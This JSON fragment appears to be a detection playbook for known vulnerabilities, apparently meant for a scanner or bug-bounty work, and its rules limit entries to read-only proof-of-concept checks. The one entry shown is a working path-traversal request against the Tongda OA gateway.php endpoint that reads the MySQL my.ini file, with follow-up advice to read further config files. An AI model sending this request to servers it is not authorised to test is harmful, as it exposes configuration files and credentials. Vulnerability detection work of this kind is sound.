{
  "_comment": "N-day 打法库。硬门槛：每条必须填 harmless_note（只读检测/无害验证说明）；只放公开已知检测型 PoC；禁止爆破字典、写操作 payload、反连。path 必以 / 开头。条目按 fingerprint 分组挂载，fallback_title_kw 供标题兜底匹配。",
  "entries": [
    {
      "id": "tongda-oa-gateway-file-read",
      "fingerprint": "oa_tongda",
      "fallback_title_kw": [
        "通达oa",
        "tongda"
      ],
      "name": "通达OA gateway 接口任意文件读取检测",
      "vuln_type": "arbitrary_file_read",
      "severity_hint": "high",
      "check": {
        "method": "POST",
        "path": "/ispirit/interface/gateway.php",
        "headers": {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "body": "json={\"url\":\"/general/../../mysql5/my.ini\",\"name\":\"1.txt\"}"
      },
      "match": {
        "status_in": [
          200
        ],
        "body_contains_all": [
          "[mysql]"
        ],
        "body_len_gt": 50
      },
      "next": "命中后换读其它配置文件（如 oa.config.php）证明可读范围，按 arbitrary_file_read 提交，贴出文件内容证据；严禁写入/上传变体",
      "harmless_note": "只读探测，仅读取服务器配置文件证明存在漏洞，无写入/删除动作"
    },
